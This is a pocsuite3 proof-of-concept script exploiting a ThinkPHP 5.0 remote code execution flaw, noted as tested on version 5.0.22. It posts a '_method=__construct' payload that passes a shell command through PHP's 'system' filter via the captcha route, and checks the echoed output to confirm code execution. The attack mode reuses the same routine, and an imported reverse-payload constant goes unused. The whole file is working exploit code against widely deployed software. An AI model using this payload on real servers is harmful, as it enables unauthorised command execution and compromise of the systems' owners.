from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from urllib.parse import urlparse, parse_qs, urljoin
import requests

class TestPOC(POCBase):
 	
	vulID = '1'
	name = 'think_php_rce'
	appName = 'Thinkphp'
	appVersion = '5.0'
	desc = '测试过5.0.22,可用'
	
	def _verify(self):

			result = {}
			payload = {
					   '_method':'__construct',
					   'filter[]':'system',
					   'method':'get',
					   'get[]':'echo watch_dog'
			}
			url_parse = urlparse(self.url)
			if url_parse.query:
					qs = parse_qs(url_parse.query)						
					if 's' in qs:
							query_list = []
							for i in qs:
									if i == 's':
											qs[i][0] = 'captcha'
									query_list.append(i+'='+qs[i][0])
							query = '&'.join(query_list)
							url = url_parse.scheme+'://'+url_parse.netloc+url_parse.path+url_parse.params+'?'+query
					else:
						url = self.url+'&'+'s=captcha'
												
			else:
				url = self.url+'?'+'s=captcha'
			try:
				request = requests.post(url,payload)
				if request.text:
					if 'watch_dog' in request.text and '模块不存在:captcha' not in request.text:
							req = requests.post(url,payload)
							#print(req.text)
							print(url)
							result['VerifyInfo'] = {}
							result['VerifyInfo']['URL'] = url
							result['VerifyInfo']['Name'] = payload
						
			except Exception as e:
						pass
			return self.parse_output(result)

	
	def parse_output(self, result):
			output = Output(self)
			if result:
					output.success(result)
			else:
				output.fail('target is not vulnerable')
			return output


	def _attack(self):
			return self._verify()

register_poc(TestPOC)			
